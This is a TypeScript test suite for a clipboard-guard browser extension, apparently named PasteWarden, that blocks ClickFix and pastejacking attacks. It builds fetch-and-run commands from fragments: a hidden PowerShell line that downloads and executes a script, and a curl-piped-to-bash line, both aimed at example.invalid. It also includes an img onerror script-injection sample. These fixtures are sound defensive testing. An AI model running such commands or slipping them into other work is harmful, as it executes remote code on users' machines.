// Guard decisions with the real engine (@paste-warden/core's WASM build, loaded from dist/).
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { analyze, init, mask } from '@paste-warden/core';
import { beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  type BlockedEvent,
  type EngineApi,
  editableTarget,
  Guard,
  type GuardEnv,
  htmlToText,
  type WarnEvent,
} from '../src/lib/guard';
import type { Reply } from '../src/lib/protocol';
import { type BlockRecord, DEFAULT_SETTINGS, type ExtSettings } from '../src/lib/settings';

const clickfix = () =>
  ['power', 'shell -w hidden -c "i', 'ex(i', "wr 'https://example.invalid/a.ps1')\""].join('');
const pipeShell = () => ['cu', 'rl -s https://example.invalid/p | ', 'ba', 'sh'].join('');

let engine: EngineApi;

beforeAll(async () => {
  const wasm = readFileSync(
    resolve(process.cwd(), '../../packages/core-js/dist/wasm/paste_warden_bg.wasm'),
  );
  await init({ backend: 'wasm', wasm });
  engine = { backend: 'wasm', analyze, mask };
});

interface Harness {
  guard: Guard;
  blocked: BlockedEvent[];
  warned: WarnEvent[];
  records: BlockRecord[];
  waits: Array<[number, Reply]>;
  overwrites: string[];
  settings: ExtSettings;
  engineOn: boolean;
  clock: number;
}

function harness(patch: Partial<ExtSettings> = {}): Harness {
  const h: Harness = {
    blocked: [],
    warned: [],
    records: [],
    waits: [],
    overwrites: [],
    settings: { ...DEFAULT_SETTINGS, ...patch },
    engineOn: true,
    clock: 1_000_000,
    guard: undefined as unknown as Guard,
  };
  const env: GuardEnv = {
    win: window as unknown as Window & typeof globalThis,
    settings: () => h.settings,
    engine: () => (h.engineOn ? engine : null),
    presentBlocked: (e) => h.blocked.push(e),
    presentWarning: (e) => h.warned.push(e),
    confirmPaste: async () => 'cancel',
    overwriteClipboard: async (text) => {
      h.overwrites.push(text);
      return true;
    },
    record: (r) => h.records.push(r),
    resolveWait: (id, reply) => h.waits.push([id, reply]),
    now: () => h.clock,
    later: (fn) => fn(),
  };
  h.guard = new Guard(env);
  return h;
}

beforeEach(() => {
  vi.spyOn(console, 'warn').mockImplementation(() => {});
});

describe('clipboard writes', () => {
  it('blocks a ClickFix write and hands MAIN only the notice', () => {
    const h = harness({ locale: 'en' });
    const reply = h.guard.onWrite({ via: 'writeText', text: clickfix() });
    expect(reply.v).toBe('block');
    if (reply.v !== 'block') return;
    expect(reply.notice).toContain('PasteWarden');
    expect(reply.notice).not.toContain('example.invalid');
    expect(Object.keys(reply).sort()).toEqual(['notice', 'v']);
    expect(h.blocked).toHaveLength(1);
    expect(h.blocked[0]?.report.action).toBe('quarantine');
    expect(h.records).toEqual([
      { domain: window.location.hostname, time: h.clock, kind: 'command', masked: '' },
    ]);
  });

  it('renders the notice in the chosen language', () => {
    const zh = harness({ locale: 'zh-TW' }).guard.onWrite({ via: 'setData', text: clickfix() });
    expect(zh.v === 'block' && zh.notice).toContain('剪貼簿守門員');
  });

  it('the notice itself is harmless', () => {
    for (const locale of ['en', 'zh-TW'] as const) {
      const h = harness({ locale });
      expect(engine.analyze(h.guard.notice(), {}).action).toBe('allow');
    }
  });

  it('lets ordinary text through without any UI', () => {
    const h = harness();
    expect(h.guard.onWrite({ via: 'writeText', text: 'npm install left-pad' })).toEqual({
      v: 'allow',
    });
    expect(h.blocked).toHaveLength(0);
    expect(h.warned).toHaveLength(0);
    expect(h.records).toHaveLength(0);
  });

  it('does not treat a page copying a secret as an attack', () => {
    const h = harness();
    const id = ['A12', '3456', '789'].join('');
    expect(h.guard.onWrite({ via: 'writeText', text: `ID ${id}` })).toEqual({ v: 'allow' });
    expect(h.warned).toHaveLength(0);
  });

  it('analyzes the text of an HTML payload', () => {
    const h = harness();
    const reply = h.guard.onWrite({ via: 'setData', text: `<pre>${clickfix()}</pre>`, html: true });
    expect(reply.v).toBe('block');
  });

  it('stays out when disabled, allowlisted, or write blocking is off (then only warns)', () => {
    expect(
      harness({ enabled: false }).guard.onWrite({ via: 'writeText', text: clickfix() }).v,
    ).toBe('allow');
    const host = window.location.hostname;
    expect(
      harness({ allowlist: [host] }).guard.onWrite({ via: 'writeText', text: clickfix() }).v,
    ).toBe('allow');
    const h = harness({ guardWrites: false });
    expect(h.guard.onWrite({ via: 'writeText', text: clickfix() }).v).toBe('allow');
    expect(h.warned).toHaveLength(1);
    expect(h.warned[0]?.kind).toBe('warning');
  });

  it('block_malicious_commands off: warn instead of block', () => {
    const h = harness({ block_malicious_commands: false });
    expect(h.guard.onWrite({ via: 'writeText', text: clickfix() }).v).toBe('allow');
    expect(h.warned).toHaveLength(1);
  });

  it('shows one dialog for the text/plain + text/html pair of one copy', () => {
    const h = harness();
    h.guard.onWrite({ via: 'setData', text: clickfix() });
    h.guard.onWrite({ via: 'setData', text: `<b>${clickfix()}</b>`, html: true });
    expect(h.blocked).toHaveLength(1);
    expect(h.records).toHaveLength(1);
  });

  it('waits for the engine: async writes get their answer later, sync ones are overwritten', () => {
    const h = harness();
    h.engineOn = false;
    const a = h.guard.onWrite({ via: 'writeText', text: clickfix() });
    const s = h.guard.onWrite({ via: 'setData', text: `${clickfix()} ` });
    const benign = h.guard.onWrite({ via: 'writeText', text: 'hello' });
    expect(a.v).toBe('wait');
    expect(s.v).toBe('wait');
    h.engineOn = true;
    h.guard.engineReady();
    expect(h.waits.map(([, r]) => r.v)).toEqual(['block', 'allow']);
    expect(h.waits[0]?.[0]).toBe(a.v === 'wait' ? a.id : -1);
    expect(benign.v === 'wait' && h.waits[1]?.[0]).toBe(benign.v === 'wait' ? benign.id : -1);
    expect(h.overwrites).toHaveLength(1);
    expect(h.overwrites[0]).toContain('PasteWarden');
  });
});

describe('pastejacking', () => {
  it('warns when the copy handler swaps the selection for a command', () => {
    const h = harness({ locale: 'en' });
    h.guard.copied('npm install foo');
    // A command the engine only rates as suspicious would still be flagged here; this one is
    // malicious, so the write is blocked outright.
    const r = h.guard.onWrite({ via: 'setData', text: pipeShell() });
    expect(r.v === 'block' || h.warned[0]?.kind === 'pastejack').toBe(true);
  });

  it('warns about added invisible characters', () => {
    const h = harness({ locale: 'en' });
    h.guard.copied('rm -i file');
    expect(h.guard.onWrite({ via: 'setData', text: 'rm -i​ file' }).v).toBe('allow');
    expect(h.warned).toHaveLength(1);
    expect(h.warned[0]?.kind).toBe('pastejack');
    expect(h.warned[0]?.reasons.join(' ')).toMatch(/invisible/i);
    expect(h.records[0]?.kind).toBe('pastejack');
  });

  it('news-site attribution is fine', () => {
    const h = harness();
    h.guard.copied('今天股市上漲');
    h.guard.onWrite({
      via: 'setData',
      text: '今天股市上漲\n\n原文出處：https://news.example.invalid/1',
    });
    expect(h.warned).toHaveLength(0);
  });

  it('async writes count only within 2 s of the copy and without input in between', () => {
    const h = harness();
    h.guard.copied('rm -i file');
    h.clock += 500;
    h.guard.onWrite({ via: 'writeText', text: 'rm -i​ file' });
    expect(h.warned).toHaveLength(1);

    const late = harness();
    late.guard.copied('rm -i file');
    late.clock += 2500;
    late.guard.onWrite({ via: 'writeText', text: 'rm -i​ file' });
    expect(late.warned.filter((w) => w.kind === 'pastejack')).toHaveLength(0);

    const clicked = harness();
    clicked.guard.copied('rm -i file');
    clicked.clock += 100;
    clicked.guard.inputSeen();
    clicked.guard.onWrite({ via: 'writeText', text: 'rm -i​ file' });
    expect(clicked.warned.filter((w) => w.kind === 'pastejack')).toHaveLength(0);
  });

  it('can be turned off', () => {
    const h = harness({ pastejack: false });
    h.guard.copied('rm -i file');
    h.guard.onWrite({ via: 'setData', text: 'rm -i​ file' });
    expect(h.warned.filter((w) => w.kind === 'pastejack')).toHaveLength(0);
  });
});

describe('helpers', () => {
  it('htmlToText never runs or loads anything', () => {
    const w = window as unknown as Window & typeof globalThis;
    expect(htmlToText(w, '<p>a<img src="x" onerror="globalThis.__pwn=1">b</p>')).toBe('ab');
    expect((globalThis as { __pwn?: number }).__pwn).toBeUndefined();
  });

  it('editableTarget skips password fields and non-editable targets', () => {
    const seen: Array<Element | null> = [];
    const listen = (el: Element) => {
      el.addEventListener('paste', (e) => seen.push(editableTarget(e)));
      el.dispatchEvent(new Event('paste', { bubbles: true, composed: true }));
    };
    document.body.innerHTML =
      '<input id="t" type="text"><input id="p" type="password"><textarea id="a"></textarea><div id="d">x</div><div id="c" contenteditable="true">y</div>';
    for (const id of ['t', 'p', 'a', 'd', 'c']) listen(document.getElementById(id) as Element);
    expect(seen.map((e) => (e as HTMLElement | null)?.id ?? null)).toEqual([
      't',
      null,
      'a',
      null,
      'c',
    ]);
  });
});
